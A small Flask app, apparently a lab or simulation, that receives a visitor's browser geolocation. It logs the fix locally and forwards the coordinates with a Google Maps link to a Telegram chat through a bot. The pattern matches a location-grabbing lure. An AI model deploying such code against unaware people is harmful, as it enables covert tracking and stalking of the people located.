from flask import Flask, request, jsonify, render_template
from datetime import datetime, timezone
import json
import uuid
import os
from pathlib import Path

import requests


app = Flask(__name__)

LOG = Path("locations.jsonl")

# Variáveis configuradas no Vercel
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")


@app.get("/")
def home():
    return render_template("index.html")


@app.post("/location")
def location():
    data = request.get_json(force=True)

    latitude = data.get("latitude")
    longitude = data.get("longitude")
    accuracy = data.get("accuracy_m")

    # Gera o link direto para o Google Maps
    maps_url = None

    if latitude is not None and longitude is not None:
        maps_url = f"https://www.google.com/maps?q={latitude},{longitude}"

    record = {
        "id": str(uuid.uuid4()),
        "received_at": datetime.now(timezone.utc).isoformat(),
        "latitude": latitude,
        "longitude": longitude,
        "accuracy_m": accuracy,
        "client_timestamp": data.get("timestamp"),
        "maps_url": maps_url
    }

    # Registro local para o laboratório
    with LOG.open("a", encoding="utf-8") as f:
        f.write(
            json.dumps(record, ensure_ascii=False) + "\n"
        )

    # Envia a localização autorizada para o Telegram
    if (
        latitude is not None
        and longitude is not None
        and TELEGRAM_BOT_TOKEN
        and TELEGRAM_CHAT_ID
    ):
        telegram_url = (
            f"https://api.telegram.org/"
            f"bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        )

        message = (
            "📍 Localização recebida — SIMULAÇÃO\n\n"
            f"Latitude: {latitude}\n"
            f"Longitude: {longitude}\n"
            f"Precisão: {accuracy} m\n\n"
            f"🗺️ Abrir no Google Maps:\n"
            f"{maps_url}"
        )

        try:
            response = requests.post(
                telegram_url,
                json={
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": message
                },
                timeout=10
            )

            response.raise_for_status()

        except requests.RequestException as error:
            print(
                f"Erro ao enviar localização para o Telegram: {error}"
            )

    # Retorna o link do Google Maps
    return jsonify({
        "ok": True,
        "id": record["id"],
        "maps_url": maps_url
    })


if __name__ == "__main__":
    app.run(
        host="127.0.0.1",
        port=8000,
        debug=False
    )